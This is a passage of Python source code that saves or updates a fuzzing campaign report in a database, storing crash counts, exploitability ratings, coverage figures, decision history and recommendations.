            unique_crashes=status.get("unique_crashes", 0),
            exploitable_crashes=status.get("exploitable_crashes", 0),
            crashes=crashes,
            decisions=decisions,
            coverage_data=status.get("coverage_data"),
        )

        # Calculate duration
        duration_seconds = int((completed_at - started_at).total_seconds())

        # Save to database
        async with async_session_maker() as session:
            # Check if report already exists
            from sqlalchemy import select
            query = select(FuzzingCampaignReport).where(
                FuzzingCampaignReport.campaign_id == campaign_id
            )
            result = await session.execute(query)
            existing = result.scalar_one_or_none()

            if existing:
                # Update existing report
                existing.status = status.get("status", "completed")
                existing.completed_at = completed_at
                existing.duration_seconds = duration_seconds
                existing.total_executions = status.get("total_executions", 0)
                existing.executions_per_second = status.get("executions_per_second", 0.0)
                existing.final_coverage = status.get("coverage_percentage", 0.0)
                existing.unique_crashes = status.get("unique_crashes", 0)
                existing.exploitable_crashes = status.get("exploitable_crashes", 0)
                existing.total_decisions = len(decisions)
                existing.report_data = {
                    "risk_rating": report_data.risk_rating,
                    "key_findings": report_data.key_findings,
                    "strategy_effectiveness": report_data.strategy_effectiveness,
                }
                existing.executive_summary = report_data.executive_summary
                existing.findings_summary = "\n".join(report_data.key_findings)
                existing.recommendations = "\n".join(report_data.recommendations)
                existing.markdown_report = markdown_report
                existing.decisions = [
                    {
                        "decision_id": d.decision_id,
                        "timestamp": d.timestamp.isoformat(),
                        "decision_type": d.decision_type,
                        "reasoning": d.reasoning,
                    }
                    for d in report_data.decision_history
                ]
                existing.crashes = [
                    {
                        "crash_id": c.crash_id,
                        "crash_type": c.crash_type,
                        "exploitability": c.exploitability,
                        "confidence": c.confidence,
                        "impact": c.impact,
                        "recommendation": c.recommendation,
                    }
                    for c in report_data.crash_findings
                ]
            else:
                # Create new report
                new_report = FuzzingCampaignReport(
                    campaign_id=campaign_id,
                    user_id=user_id,
                    binary_name=status.get("binary_name", "unknown"),
                    binary_hash=status.get("binary_hash"),
                    binary_type=status.get("binary_type"),
                    architecture=status.get("architecture"),
                    status=status.get("status", "completed"),
                    started_at=started_at,
                    completed_at=completed_at,
                    duration_seconds=duration_seconds,
                    total_executions=status.get("total_executions", 0),
                    executions_per_second=status.get("executions_per_second", 0.0),
                    final_coverage=status.get("coverage_percentage", 0.0),
                    unique_crashes=status.get("unique_crashes", 0),
                    exploitable_crashes=status.get("exploitable_crashes", 0),
                    total_decisions=len(decisions),
                    report_data={
                        "risk_rating": report_data.risk_rating,
                        "key_findings": report_data.key_findings,
                        "strategy_effectiveness": report_data.strategy_effectiveness,
                    },
                    executive_summary=report_data.executive_summary,
                    findings_summary="\n".join(report_data.key_findings),
                    recommendations="\n".join(report_data.recommendations),
                    markdown_report=markdown_report,
                    decisions=[
                        {
                            "decision_id": d.decision_id,
                            "timestamp": d.timestamp.isoformat(),
                            "decision_type": d.decision_type,
                            "reasoning": d.reasoning,
                        }
                        for d in report_data.decision_history
                    ],
                    crashes=[
                        {
                            "crash_id": c.crash_id,
                            "crash_type": c.crash_type,
                            "exploitability": c.exploitability,
                            "confidence": c.confidence,
                            "impact": c.impact,
                            "recommendation": c.recommendation,
                        }
                        for c in report_data.crash_findings
                    ],
                )
                session.add(new_report)

            await session.commit()
            logger.info(f"Report saved for campaign {campaign_id}")

    except Exception as e:
        logger.error(f"Failed to generate report for {campaign_id}: {e}", exc_info=True)
